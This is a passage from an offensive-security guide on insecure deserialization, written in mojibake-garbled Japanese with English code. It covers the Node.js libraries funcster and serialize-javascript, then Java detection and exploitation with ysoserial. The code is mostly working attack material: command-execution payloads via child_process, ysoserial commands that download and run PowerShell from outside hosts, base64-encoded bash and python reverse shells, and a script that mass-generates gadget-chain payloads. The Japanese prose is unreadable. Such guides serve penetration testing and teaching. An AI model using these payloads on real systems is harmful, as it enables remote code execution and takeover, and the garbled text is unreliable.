ã“ã®åˆ¶é™ã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€ç‰¹å®šã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’é€šã˜ã¦ã€ã™ã¹ã¦ã®æ¨™æº–ã®çµ„ã¿è¾¼ã¿ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å«ã‚€ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã¸ã®å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾©å…ƒã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’ç›´æ¥åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€ã“ã®åˆ¶é™ã‚’å›é¿ã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€æ¬¡ã®ã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’å†ç¢ºç«‹ã§ãã¾ã™ï¼š
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**è©³ç´°ã«ã¤ã„ã¦ã¯ã€[ã“ã®ã‚½ãƒ¼ã‚¹ã‚’èª­ã‚“ã§ãã ã•ã„](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript**ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ã€ã‚·ãƒªã‚¢ãƒ«åŒ–å°‚ç”¨ã«è¨­è¨ˆã•ã‚Œã¦ãŠã‚Šã€çµ„ã¿è¾¼ã¿ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ«åŒ–æ©Ÿèƒ½ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ‡ã‚·ãƒªã‚¢ãƒ«åŒ–ã®ãŸã‚ã®ç‹¬è‡ªã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å®Ÿè£…ã™ã‚‹è²¬ä»»ãŒã‚ã‚Šã¾ã™ã€‚ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ«åŒ–ã™ã‚‹ãŸã‚ã®å…¬å¼ã®ä¾‹ã§ã¯ã€`eval`ã®ç›´æ¥ä½¿ç”¨ãŒæ¨å¥¨ã•ã‚Œã¦ã„ã¾ã™ï¼š
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
ã“ã®é–¢æ•°ãŒã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹å ´åˆã€ã‚ãªãŸã¯**ç°¡å˜ã«ãã‚Œã‚’æ‚ªç”¨ã§ãã¾ã™**ï¼š
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**è©³ç´°ã«ã¤ã„ã¦ã¯ã“ã®ã‚½ãƒ¼ã‚¹ã‚’èª­ã‚“ã§ãã ã•ã„**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryoãƒ©ã‚¤ãƒ–ãƒ©ãƒª

ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã«é–¢ã™ã‚‹æƒ…å ±ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Javaã§ã¯ã€**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã¯ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®ãƒ—ãƒ­ã‚»ã‚¹ä¸­ã«å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚ã“ã®å®Ÿè¡Œã¯ã€ã“ã‚Œã‚‰ã®ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹æ”»æ’ƒè€…ã«ã‚ˆã£ã¦æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€æœ‰å®³ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®å®Ÿè¡Œã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒˆ

#### ãƒ›ãƒ¯ã‚¤ãƒˆãƒœãƒƒã‚¯ã‚¹

ã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹å†…ã®æ½œåœ¨çš„ãªã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ã‚’ç‰¹å®šã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚‚ã®ã‚’æ¢ã—ã¾ã™ï¼š

* `Serializable`ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹ã‚¯ãƒ©ã‚¹ã€‚
* `java.io.ObjectInputStream`ã€`readObject`ã€`readUnshared`é–¢æ•°ã®ä½¿ç”¨ã€‚

ç‰¹ã«æ³¨æ„ã‚’æ‰•ã†ã¹ãç‚¹ï¼š

* å¤–éƒ¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦å®šç¾©ã•ã‚ŒãŸãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ä½¿ç”¨ã•ã‚Œã‚‹`XMLDecoder`ã€‚
* `XStream`ã®`fromXML`ãƒ¡ã‚½ãƒƒãƒ‰ã€ç‰¹ã«XStreamã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒ1.46ä»¥ä¸‹ã®å ´åˆã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®å•é¡Œã«å¯¾ã—ã¦è„†å¼±ã§ã™ã€‚
* `readObject`ãƒ¡ã‚½ãƒƒãƒ‰ã¨çµ„ã¿åˆã‚ã•ã‚ŒãŸ`ObjectInputStream`ã€‚
* `readObject`ã€`readObjectNodData`ã€`readResolve`ã€ã¾ãŸã¯`readExternal`ãªã©ã®ãƒ¡ã‚½ãƒƒãƒ‰ã®å®Ÿè£…ã€‚
* `ObjectInputStream.readUnshared`ã€‚
* `Serializable`ã®ä¸€èˆ¬çš„ãªä½¿ç”¨ã€‚

#### ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹

ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹ãƒ†ã‚¹ãƒˆã§ã¯ã€javaã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ç¤ºã™ç‰¹å®šã®**ã‚·ã‚°ãƒãƒãƒ£ã¾ãŸã¯ã€Œãƒã‚¸ãƒƒã‚¯ãƒã‚¤ãƒˆã€**ã‚’æ¢ã—ã¾ã™ï¼ˆ`ObjectInputStream`ã‹ã‚‰ç™ºç”Ÿï¼‰ï¼š

* 16é€²ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼š`AC ED 00 05`ã€‚
* Base64ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼š`rO0`ã€‚
* `Content-type`ãŒ`application/x-java-serialized-object`ã«è¨­å®šã•ã‚ŒãŸHTTPãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼ã€‚
* ä»¥å‰ã®åœ§ç¸®ã‚’ç¤ºã™16é€²ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼š`1F 8B 08 00`ã€‚
* ä»¥å‰ã®åœ§ç¸®ã‚’ç¤ºã™Base64ãƒ‘ã‚¿ãƒ¼ãƒ³ï¼š`H4sIA`ã€‚
* `.faces`æ‹¡å¼µå­ã‚’æŒã¤Webãƒ•ã‚¡ã‚¤ãƒ«ã¨`faces.ViewState`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã€‚ã“ã‚Œã‚‰ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ç™ºè¦‹ã—ãŸå ´åˆã€[Java JSF ViewState Deserializationã«é–¢ã™ã‚‹æŠ•ç¨¿](java-jsf-viewstate-.faces-deserialization.md)ã«è©³è¿°ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«èª¿æŸ»ã‚’ä¿ƒã™ã¹ãã§ã™ã€‚
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### è„†å¼±æ€§ã®ç¢ºèª

**Javaã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºæ”»æ’ƒãŒã©ã®ã‚ˆã†ã«æ©Ÿèƒ½ã™ã‚‹ã‹ã‚’å­¦ã³ãŸã„**å ´åˆã¯ã€[**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md)ã€[**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md)ã€ãŠã‚ˆã³[**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

#### ãƒ›ãƒ¯ã‚¤ãƒˆãƒœãƒƒã‚¯ã‚¹ãƒ†ã‚¹ãƒˆ

æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æŒã¤ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã§ãã¾ã™ã€‚
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
ã‚ãªãŸã¯ã€**è„†å¼±æ€§ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç¢ºèª**ã—ã€[**Ysoserial**](https://github.com/frohoff/ysoserial)ãŒã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æä¾›ã§ãã‚‹ã‹ã©ã†ã‹ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã¯ã€[Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json)ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç¢ºèªã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚\
[**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector)ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆå¯èƒ½ãªå¯èƒ½æ€§ã®ã‚ã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆãƒã‚§ãƒ¼ãƒ³ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚\
**gadgetinspector**ã‚’å®Ÿè¡Œã™ã‚‹éš›ï¼ˆãƒ“ãƒ«ãƒ‰å¾Œï¼‰ã¯ã€ç™ºç”Ÿã™ã‚‹å¤§é‡ã®è­¦å‘Š/ã‚¨ãƒ©ãƒ¼ã‚’æ°—ã«ã›ãšã€å®Œäº†ã™ã‚‹ã¾ã§å¾…ã£ã¦ãã ã•ã„ã€‚ã™ã¹ã¦ã®çµæœã¯_gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ã«æ›¸ãè¾¼ã¾ã‚Œã¾ã™ã€‚**gadgetinspectorã¯ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã›ãšã€å½é™½æ€§ã‚’ç¤ºã™å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„**ã€‚

#### ãƒ–ãƒ©ãƒƒã‚¯ãƒœãƒƒã‚¯ã‚¹ãƒ†ã‚¹ãƒˆ

Burpæ‹¡å¼µæ©Ÿèƒ½[**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md)ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ã©ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒåˆ©ç”¨å¯èƒ½ã‹**ï¼ˆãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚‚å«ã‚€ï¼‰ã‚’ç‰¹å®šã§ãã¾ã™ã€‚ã“ã®æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€è„†å¼±æ€§ã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ãŸã‚ã®**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é¸æŠã—ã‚„ã™ããªã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
[**GadgetProbeã«ã¤ã„ã¦è©³ã—ãå­¦ã¶ã«ã¯ã“ã¡ã‚‰ã‚’ãŠèª­ã¿ãã ã•ã„**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ã€‚**\
GadgetProbeã¯**`ObjectInputStream`ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã«ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã¾ã™ã€‚

Burpæ‹¡å¼µæ©Ÿèƒ½[**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ysoserialã§ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆå¯èƒ½ãªè„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç‰¹å®š**ã—ã€**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**ã§ãã¾ã™ã€‚\
[**Java Deserialization Scannerã«ã¤ã„ã¦è©³ã—ãå­¦ã¶ã«ã¯ã“ã¡ã‚‰ã‚’ãŠèª­ã¿ãã ã•ã„ã€‚**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scannerã¯**`ObjectInputStream`**ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã«ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã¾ã™ã€‚

[**Freddy**](https://github.com/nccgroup/freddy)ã‚’ä½¿ç”¨ã—ã¦ã€**Burp**å†…ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®è„†å¼±æ€§ã‚’**æ¤œå‡º**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã“ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯ã€**`ObjectInputStream`**ã«é–¢é€£ã™ã‚‹è„†å¼±æ€§ã ã‘ã§ãªãã€**Json**ãŠã‚ˆã³**Yml**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‹ã‚‰ã®è„†å¼±æ€§ã‚‚æ¤œå‡ºã—ã¾ã™ã€‚ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ¢ãƒ¼ãƒ‰ã§ã¯ã€ã‚¹ãƒªãƒ¼ãƒ—ã¾ãŸã¯DNSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ç¢ºèªã‚’è©¦ã¿ã¾ã™ã€‚\
[**Freddyã«ã¤ã„ã¦ã®è©³ç´°æƒ…å ±ã¯ã“ã¡ã‚‰ã§ç¢ºèªã§ãã¾ã™ã€‚**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãƒ†ã‚¹ãƒˆ**

ã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹è„†å¼±ãªãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ç¢ºèªã™ã‚‹ã“ã¨ã ã‘ãŒå…¨ã¦ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚æ™‚ã«ã¯ã€**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã—ã¦ã„ãã¤ã‹ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹**ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼ˆã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªå†…ã§ç®¡ç†è€…æ¨©é™ã‚’ä»˜ä¸ã•ã‚Œã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚\
ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«é€ä¿¡ã•ã‚Œã‚‹Javaã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’è¦‹ã¤ã‘ãŸå ´åˆã€**[SerializationDumper](https://github.com/NickstaDB/SerializationDumper)**ã‚’ä½¿ç”¨ã—ã¦ã€é€ä¿¡ã•ã‚Œã‚‹ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚ˆã‚Šäººé–“ãŒèª­ã¿ã‚„ã™ã„å½¢å¼ã§å°åˆ·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚é€ä¿¡ã—ã¦ã„ã‚‹ãƒ‡ãƒ¼ã‚¿ãŒã‚ã‹ã‚Œã°ã€ãã‚Œã‚’å¤‰æ›´ã—ã¦ã„ãã¤ã‹ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã®ãŒå®¹æ˜“ã«ãªã‚Šã¾ã™ã€‚

### **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**

#### **ysoserial**

Javaãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ãŸã‚ã®ä¸»ãªãƒ„ãƒ¼ãƒ«ã¯[**ysoserial**](https://github.com/frohoff/ysoserial)ã§ã™ï¼ˆ[**ã“ã¡ã‚‰ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)ï¼‰ã€‚ã¾ãŸã€è¤‡é›‘ãªã‚³ãƒãƒ³ãƒ‰ï¼ˆä¾‹ãˆã°ãƒ‘ã‚¤ãƒ—ã‚’ä½¿ç”¨ï¼‰ã‚’ä½¿ç”¨ã§ãã‚‹[**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)ã®ä½¿ç”¨ã‚‚æ¤œè¨ã§ãã¾ã™ã€‚\
ã“ã®ãƒ„ãƒ¼ãƒ«ã¯**`ObjectInputStream`**ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã«**ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚\
ç§ã¯**RCEãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å‰ã«ã€ŒURLDNSã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—å§‹ã‚ã‚‹**ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚æ³¨ç›®ã™ã¹ãã¯ã€ã€ŒURLDNSã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã—ãªã„å ´åˆã§ã‚‚ã€ä»–ã®RCEãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã“ã¨ã§ã™ã€‚
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
When creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€Windowsã¨Linuxã®**ã™ã¹ã¦ã®å¯èƒ½ãªã‚³ãƒ¼ãƒ‰å®Ÿè¡Œ**ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½œæˆã—ã€è„†å¼±ãªã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã§ãƒ†ã‚¹ãƒˆã—ã¦ãã ã•ã„:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

